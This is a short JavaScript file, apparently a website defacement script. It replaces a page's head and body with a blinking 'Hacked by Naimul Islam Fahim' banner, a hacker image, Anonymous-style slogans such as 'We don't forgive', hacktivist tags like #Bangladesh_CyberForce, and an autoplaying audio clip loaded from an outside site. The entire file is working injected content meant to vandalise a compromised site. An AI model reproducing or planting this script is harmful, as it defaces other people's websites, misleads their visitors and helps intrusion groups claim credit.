document.body.style = `
  background: black;
  color: lime;
  text-align: center;
  padding: 5vh 2vw;
  font-family: 'Courier New', monospace;
  margin: 0;
`;

document.head.innerHTML += `
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    h1 {
      font-size: 6vw;
      color: red;
      text-shadow: 0 0 10px white;
      animation: blink 1s infinite;
      margin: 0;
    }
    img {
      width: 40vw;
      max-width: 200px;
      border-radius: 50%;
      box-shadow: 0 0 20px lime;
      margin-top: 30px;
    }
    p {
      font-size: 4vw;
      max-width: 90%;
      margin: 30px auto 0;
      line-height: 1.5em;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }
    @media (min-width: 768px) {
      h1 { font-size: 3em; }
      p { font-size: 1.5em; }
    }
  </style>
`;

document.body.innerHTML = `
  <h1>Hacked by Naimul Islam Fahim</h1>
  <img src="https://i.ibb.co/S2rR5CV/images.jpg" alt="Hacker">
  <p>We are everywhere. We see everything.<br>
  We don't forget. We don't forgive.<br>
  <strong>#Team_Fahim #Bangladesh_CyberForce<br>#K4RL0S #Shanto</strong>
  </p>
  <p style="margin-top:20px;font-size:1.2em;color:#0ff;">We are SSC Batch 2K25 — Hack the Future, Not the System 😎</p>
  <p>We work for our country</p>
  <audio autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/anonymous.mp3" type="audio/mpeg">
  </audio>
`;
